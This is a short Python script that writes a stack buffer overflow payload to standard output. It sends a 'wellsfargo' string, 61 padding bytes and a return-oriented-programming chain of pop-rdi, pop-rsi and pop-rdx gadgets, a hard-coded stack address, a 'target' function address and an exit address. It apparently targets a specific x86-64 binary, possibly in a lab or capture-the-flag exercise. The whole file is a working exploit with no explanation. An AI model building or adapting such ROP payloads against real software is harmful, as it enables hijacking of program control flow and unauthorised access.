#!/usr/bin/env python3

import sys
sys.stdout.buffer.write(b"wellsfargo\x00")
sys.stdout.buffer.write(b"\x41" * 61)
#pop rdi; ret
sys.stdout.buffer.write(0x000000000040206f.to_bytes(8, "little"))
#start of buffer
sys.stdout.buffer.write(0x7fffffffe500.to_bytes(8, "little"))
#pop rsi; ret
sys.stdout.buffer.write(0x000000000040a0de.to_bytes(8, "little"))
sys.stdout.buffer.write(0xA.to_bytes(8, "little"))
#pop rdx; pop rbx; ret
sys.stdout.buffer.write(0x000000000047fbeb.to_bytes(8, "little"))
sys.stdout.buffer.write(0x1.to_bytes(8, "little"))
sys.stdout.buffer.write(0x0.to_bytes(8, "little"))
#target
sys.stdout.buffer.write(0x00000000004018d8.to_bytes(8, "little"))
#exit
sys.stdout.buffer.write(0x40ad00.to_bytes(8, "little"))